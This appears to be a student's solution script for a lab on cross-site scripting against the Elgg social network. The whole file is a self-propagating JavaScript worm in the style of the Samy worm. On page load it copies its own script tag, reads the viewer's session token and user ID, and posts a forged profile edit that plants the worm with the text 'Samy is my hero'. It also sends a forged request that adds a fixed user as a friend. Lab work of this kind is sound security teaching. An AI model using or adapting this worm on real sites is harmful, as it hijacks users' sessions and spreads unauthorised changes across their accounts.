
window.onload = function () {

    var headerTag = "<script id=\"worm\">";
    var innerCode = document.getElementById("worm").innerHTML;
    var tailTag = "</"+"script>";

    var wormCode = encodeURIComponent(headerTag+innerCode+tailTag);

    
    
    
    var name = elgg.session.user.name;
    var guid = "&guid="+elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var briefDesc = "&briefdescription=Samy is my hero"+ "&accesslevel[description]=2";
    var desc = "$description="+ wormCode + "&accesslevel[description]=2";
    
    
    
    
    var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;

    
    var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
    var content = name + guid + ts + token + briefDesc + desc;

    var samyGuid = 47;

    if(elgg.session.user.guid!=samyGuid){
        
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurlPOST, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);

        
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurlGET, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send();
    }

}
